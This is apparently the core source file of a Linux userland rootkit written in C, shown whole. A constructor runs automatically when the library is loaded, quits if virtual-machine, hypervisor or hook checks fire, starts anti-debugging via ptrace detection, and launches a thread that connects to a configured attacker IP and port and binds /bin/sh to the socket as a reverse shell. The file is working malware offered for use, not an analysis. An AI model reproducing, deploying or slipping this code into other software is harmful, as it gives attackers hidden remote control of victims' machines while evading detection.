/*
 * Copyright (C) 2022 0x80000000
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include "anti.h"
#include "rkit.h"
#include "utils.h"
#include "config.h"


/*
    *    src/rkit.c
    *    Date: 04/04/22
    *    Author: 0x80000000
*/


/**
 * @brief Starts the reverse shell.
 */

void *reverse_shell(void) {
  const char *args[] = {"/bin/sh", NULL};
  int (*temp_connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen) = dlsym(RTLD_NEXT, "connect");

  int32_t fd;
  struct sockaddr_in server;
  uint8_t buffer[BUFSIZ] = {0};

  server.sin_family = AF_INET;
  server.sin_addr.s_addr = inet_addr(SERVER_IP);
  server.sin_port = htons(SERVER_PORT);

  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    return;

  if (temp_connect(fd, (struct sockaddr *)&server, sizeof(server)) == -1)
    return;

#ifdef DEBUG
  rkit_log("Connected to [%s]!\n", SERVER_IP);
#endif

  for (int32_t i = 0; i < 3; i++)
    dup2(fd, i);

  execve("/bin/sh", args, NULL);
}

/**
 * @brief Initializes the rootkit.
 */

void __attribute__((constructor)) init_rootkit(void) {
  pthread_t thread;
#ifdef DEBUG
  rkit_log("Rootkit loaded!\n");
#endif
  if (vm_cpu() || vm_uptime() || detect_jmp_hook() || DetectHypervisors())
    exit(EXIT_FAILURE);

  pthread_create(&thread, NULL, (void *)&reverse_shell, NULL);
  ptrace_detection();
}